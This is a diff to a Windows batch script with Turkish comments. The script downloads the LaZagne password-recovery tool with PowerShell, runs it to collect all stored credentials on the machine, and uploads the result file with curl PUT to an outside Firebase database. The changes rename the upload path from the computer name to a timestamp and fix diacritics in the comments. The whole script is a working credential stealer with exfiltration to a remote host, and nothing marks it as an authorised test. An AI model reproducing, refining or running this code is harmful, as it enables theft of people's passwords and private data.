@@ -11,7 +11,7 @@ echo ------------------------------------------------------------
 echo [INFO] Script basladi: %DATE% %TIME%
 echo ------------------------------------------------------------
 
-:: Lazagne.exe varsa indirimi
+:: Lazagne.exe yoksa indir
 if not exist "%LAZ_EXE%" (
     echo [INFO] Lazagne.exe bulunamadi, indiriliyor...
     powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
@@ -39,7 +39,7 @@ if errorlevel 1 (
     )
 )
 
-:: Sonuc klasoru olustur
+:: Sonuç klasörünü oluştur
 if not exist "%RESULT_DIR%" (
     mkdir "%RESULT_DIR%"
     if errorlevel 1 (
@@ -50,10 +50,10 @@ if not exist "%RESULT_DIR%" (
 )
 echo [OK] Sonuc klasoru: %RESULT_DIR%
 
-:: Kod sayfasini UTF-8 olarak ayarla
+:: Kod sayfasını UTF-8 olarak ayarla
 chcp 65001 >nul
 
-:: LaZagne ile tum credential’lari topla
+:: LaZagne ile tüm credential’ları topla
 if not exist "%LAZ_EXE%" (
     echo [ERROR] Lazagne.exe bulunamadi!
     pause
@@ -68,7 +68,7 @@ if errorlevel 1 (
     echo [OK] LaZagne calistirildi.
 )
 
-:: En son olusturulan .txt dosyasini bul
+:: En son oluşturulan .txt dosyasını bul
 set "RESULT_FILE="
 for /f "delims=" %%i in ('dir "%RESULT_DIR%\*.txt" /b /od 2^>nul') do (
     set "RESULT_FILE=%%i"
@@ -80,23 +80,21 @@ if not defined RESULT_FILE (
 )
 echo [OK] Sonuc dosyasi bulundu: %RESULT_DIR%\!RESULT_FILE!
 
-:: COMPUTERNAME'i guvenli hale getir (sadece alfanumerik karakterler)
-set "SAFE_COMPUTERNAME=%COMPUTERNAME%"
-set "SAFE_COMPUTERNAME=!SAFE_COMPUTERNAME: =!"
-set "SAFE_COMPUTERNAME=!SAFE_COMPUTERNAME:-=!"
-set "SAFE_COMPUTERNAME=!SAFE_COMPUTERNAME:_=!"
-echo [INFO] Kullanilan guvenli bilgisayar adi: !SAFE_COMPUTERNAME!
+:: Zaman damgası oluştur (örnek: 20250614_192345)
+set "TIMESTAMP=%DATE:~-4%%DATE:~3,2%%DATE:~0,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
+set "TIMESTAMP=!TIMESTAMP: =0!"
+echo [DEBUG] TIMESTAMP: !TIMESTAMP!
 
-:: Firebase URL'yi hazirla
-set "FIREBASE_URL=%FIREBASE_BASE_URL%/%SAFE_COMPUTERNAME%"
+:: Firebase URL'yi hazırla
+set "FIREBASE_URL=%FIREBASE_BASE_URL%/uploads/!TIMESTAMP!"
+echo [DEBUG] Firebase URL: %FIREBASE_URL%.json
 
-:: Sonuclarin Firebase'e yuklenmesi (curl ile)
+:: Sonuçları Firebase'e yükle (curl ile)
 echo [INFO] Sonuclar Firebase'e yukleniyor...
 set "FULL_PATH=%RESULT_DIR%\!RESULT_FILE!"
-curl.exe -X PUT -d @"%FULL_PATH%" "%FIREBASE_URL%/!RESULT_FILE!.json" --silent --show-error
+curl.exe -X PUT -d @"%FULL_PATH%" "%FIREBASE_URL%.json" --silent --show-error
 if errorlevel 1 (
     echo [ERROR] !RESULT_FILE! yuklenemedi!
-    echo [DEBUG] Kullanilan URL: %FIREBASE_URL%/!RESULT_FILE!.json
     pause
     exit /b 1
 ) else (
